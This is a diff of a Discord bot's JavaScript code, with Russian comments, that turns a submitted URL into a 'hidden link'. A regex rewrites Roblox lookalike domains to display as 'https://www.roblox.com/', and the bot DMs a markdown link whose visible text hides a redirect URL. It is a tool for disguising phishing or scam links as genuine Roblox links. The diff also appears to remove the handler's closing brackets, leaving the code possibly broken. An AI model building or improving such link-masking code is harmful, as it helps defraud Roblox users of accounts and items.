@@ -72,52 +72,58 @@ client.on('interactionCreate', async (interaction) => {
     return;
   }
 
-  // ==================== МОДАЛКА ====================
-  if (interaction.isModalSubmit() && interaction.customId === 'link_modal') {
-    console.log(`📝 [${Date.now()}] Modal submitted by ${interaction.user.tag}`);
+// ==================== МОДАЛКА ====================
+if (interaction.isModalSubmit() && interaction.customId === 'link_modal') {
+  console.log(`📝 Modal submitted by ${interaction.user.tag}`);
 
+  try {
+    const url = interaction.fields.getTextInputValue('url_input');
+    const id = Math.random().toString(36).substring(7);
+    linksDb[id] = url;
+
+    const shortUrl = `${process.env.BASE_URL}/r/${id}`;
+    
+    const visualUrl = url
+      .replace(/https?:\/\/(roblox|roblox)[a-z0-9.-]+(\/|$)/i, 'https://www.roblox.com/')
+      .replace('https://', 'https_:_//');
+
+    // Ответ в канале
+    await interaction.reply({ 
+      content: '<a:verify:1513286049638518824> Check your DMs!', 
+      flags: [MessageFlags.Ephemeral] 
+    });
+
+    // Отправка в ЛС
     try {
-      const url = interaction.fields.getTextInputValue('url_input');
-      const id = Math.random().toString(36).substring(7);
-      linksDb[id] = url;
-
-      const shortUrl = `${process.env.BASE_URL}/r/${id}`;
-      const visualUrl = url
-        .replace(/https?:\/\/(roblox|roblox)[a-z0-9.-]+(\/|$)/i, 'https://www.roblox.com/')
-        .replace('https://', 'https_:_//');
-
-      await interaction.reply({ 
-        content: '<a:verify:1513286049638518824> Check your DMs!', 
-        flags: [MessageFlags.Ephemeral] 
+      // Первое сообщение — заголовок
+      await interaction.user.send({
+        embeds: [{
+          color: 0x274666,
+          title: '🔗 Hyperlink Generated',
+          description: '👇 **Your hidden link is ready!**\nКликни на код ниже, чтобы скопировать'
+        }]
       });
 
-      // DM
-      try {
-        await interaction.user.send({
-          embeds: [{
-            color: 0x274666,
-            title: '🔗 Hyperlink Generated',
-            description: '👇 Your link is ready!\n\n🖱️ Click on the code block below to copy it'
-          }]
-        });
+      // Второе сообщение — ссылка в кодовом блоке
+      await interaction.user.send({
+        content: `[\`${visualUrl}\`](${shortUrl})\n\`\`\`\n${visualUrl}\n\`\`\``
+      });
 
-        await interaction.user.send({ content: `[\`${visualUrl}\`](${shortUrl})` });
-        console.log(`✅ Link sent to DM for ${interaction.user.tag}`);
-      } catch (dmError) {
-        console.error('DM error:', dmError.message);
-        await interaction.followUp({
-          content: `⚠️ Не удалось отправить в ЛС. Вот ссылка: [\`${visualUrl}\`](${shortUrl})`,
-          flags: [MessageFlags.Ephemeral]
-        });
-      }
-    } catch (error) {
-      console.error('Modal processing error:', error);
-      await interaction.reply({ 
-        content: '❌ Произошла ошибка при обработке ссылки.', 
-        flags: [MessageFlags.Ephemeral] 
-      }).catch(() => {});
+      console.log(`✅ Link sent to DM for ${interaction.user.tag}`);
+    } catch (dmError) {
+      console.error('DM error:', dmError.message);
+      await interaction.followUp({
+        content: `⚠️ Не удалось отправить в ЛС.\nВот твоя ссылка:\n[\`${visualUrl}\`](${shortUrl})\n\`\`\`\n${visualUrl}\n\`\`\``,
+        flags: [MessageFlags.Ephemeral]
+      });
     }
-  }
-});
 
+  } catch (error) {
+    console.error('Modal processing error:', error);
+    await interaction.reply({ 
+      content: '❌ Произошла ошибка при обработке ссылки.', 
+      flags: [MessageFlags.Ephemeral] 
+    }).catch(() => {});
+  }
+}
 client.login(process.env.TOKEN).catch(err => console.error('Login error:', err));
